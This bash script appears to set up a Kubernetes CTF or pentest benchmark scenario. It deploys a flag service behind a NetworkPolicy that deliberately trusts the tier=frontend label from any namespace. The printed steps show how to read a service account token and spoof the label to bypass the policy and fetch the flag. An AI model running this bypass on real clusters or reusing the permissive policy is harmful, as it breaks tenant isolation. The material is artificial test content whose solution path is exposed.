#!/bin/bash
set -euo pipefail
K8S_ID="k8s-27"
CLUSTER_NAME="cve-k8s-27-netpol-bypass"
source "$(dirname "$0")/../../scripts/k8s-common.sh"

echo "[K8S-27] NetworkPolicy Bypass via Label Spoofing"
k8s_init
k8s_create_host_flag
k8s_create_cluster
k8s_wait_ready
k8s_install_calico

echo "[*] Pre-loading container images into KIND..."
k8s_load_images alpine:latest nginx:1.24-alpine bitnami/kubectl:1.28

echo "[*] Setting up namespaces and NetworkPolicy..."
k8s_apply << 'YAML'
apiVersion: v1
kind: Namespace
metadata:
  name: isolated-ns
  labels:
    security-tier: high
---
apiVersion: v1
kind: Namespace
metadata:
  name: attacker-ns
---
# Flag service in isolated namespace - protected by NetworkPolicy
apiVersion: apps/v1
kind: Deployment
metadata:
  name: flag-service
  namespace: isolated-ns
  labels:
    app: flag-service
    tier: backend
spec:
  replicas: 1
  selector:
    matchLabels:
      app: flag-service
  template:
    metadata:
      labels:
        app: flag-service
        tier: backend
    spec:
      containers:
        - name: server
          image: nginx:1.24-alpine
          imagePullPolicy: IfNotPresent
          command: ["sh", "-c"]
          args:
            - "printf 'server { listen 8080; location /flag { return 200 FLAG_PLACEHOLDER\\\\n; } location /health { return 200 ok\\\\n; } }' > /etc/nginx/conf.d/default.conf && nginx -g 'daemon off;'"
          ports:
            - containerPort: 8080
---
apiVersion: v1
kind: Service
metadata:
  name: flag-service
  namespace: isolated-ns
spec:
  selector:
    app: flag-service
  ports:
    - port: 8080
      targetPort: 8080
---
# NetworkPolicy: only pods with label tier=frontend can access flag-service
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: protect-flag
  namespace: isolated-ns
spec:
  podSelector:
    matchLabels:
      app: flag-service
  policyTypes:
    - Ingress
  ingress:
    - from:
        - namespaceSelector: {}
          podSelector:
            matchLabels:
              tier: frontend
      ports:
        - port: 8080
---
# Authorized frontend pod (can access flag-service)
apiVersion: v1
kind: Pod
metadata:
  name: frontend-pod
  namespace: isolated-ns
  labels:
    app: frontend
    tier: frontend
spec:
  containers:
    - name: app
      image: alpine:latest
      imagePullPolicy: IfNotPresent
      command: ["sleep", "3600"]
---
# Tenant RBAC: attacker-sa can only manage pods inside attacker-ns
apiVersion: v1
kind: ServiceAccount
metadata:
  name: attacker-sa
  namespace: attacker-ns
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: attacker-pods
  namespace: attacker-ns
rules:
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["create", "get", "list", "update", "delete"]
  - apiGroups: [""]
    resources: ["pods/exec"]
    verbs: ["create"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: attacker-pods
  namespace: attacker-ns
subjects:
  - kind: ServiceAccount
    name: attacker-sa
    namespace: attacker-ns
roleRef:
  kind: Role
  name: attacker-pods
  apiGroup: rbac.authorization.k8s.io
---
# Attacker pod (initially blocked by NetworkPolicy; restricted to attacker-ns by RBAC)
apiVersion: v1
kind: Pod
metadata:
  name: attacker-pod
  namespace: attacker-ns
  labels:
    app: attacker
spec:
  serviceAccountName: attacker-sa
  containers:
    - name: attacker
      image: bitnami/kubectl:1.28
      imagePullPolicy: IfNotPresent
      command: ["sleep", "3600"]
YAML

echo "[*] Waiting for pods..."
k8s_wait_pod "frontend-pod" "isolated-ns"
k8s_wait_pods_label "app=flag-service" "isolated-ns"
k8s_wait_pod "attacker-pod" "attacker-ns"
sleep 5

# Inject flag into the flag-service pod
FLAG_POD=$(kubectl get pods -n isolated-ns -l app=flag-service -o jsonpath='{.items[0].metadata.name}')
kubectl exec -n isolated-ns "$FLAG_POD" -- sh -c "echo '$FLAG' > /tmp/flag.txt" 2>/dev/null || true

# Get ClusterIP of flag service for testing
FLAG_SVC_IP=$(kubectl get svc flag-service -n isolated-ns -o jsonpath='{.spec.clusterIP}')

k8s_info
echo "    Flag service: flag-service.isolated-ns.svc.cluster.local:8080 ($FLAG_SVC_IP)"
echo "    Flag pod: $FLAG_POD"
echo ""
echo "    Exploitation steps:"
echo "    1. Verify NetworkPolicy blocks the attacker pod:"
echo "       TOKEN=\$(kubectl exec -n attacker-ns attacker-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
echo "       kubectl --token=\$TOKEN exec attacker-pod -n attacker-ns -- wget -qO- --timeout=3 http://${FLAG_SVC_IP}:8080/flag"
echo "       # This should fail - NetworkPolicy blocks non-frontend pods"
echo "    2. Discover that NetworkPolicy uses label tier=frontend for access"
echo "    3. The policy trusts the tier=frontend label from ANY namespace (namespaceSelector: {})"
echo "    4. Spoof the label inside attacker-ns (the attacker's own tenant):"
echo "       kubectl --token=\$TOKEN label pod attacker-pod -n attacker-ns tier=frontend --overwrite"
echo "       # or: kubectl --token=\$TOKEN run bypass-pod -n attacker-ns --image=alpine --labels='tier=frontend' -- sleep 3600"
echo "    5. From bypass-pod, access the flag:"
echo "       kubectl --token=\$TOKEN exec attacker-pod -n attacker-ns -- wget -qO- http://${FLAG_SVC_IP}:8080/flag"
echo ""
echo "    Note: This scenario tests the pentest framework's ability to"
echo "    identify label-trusted NetworkPolicy and bypass it from the attacker's own tenant."
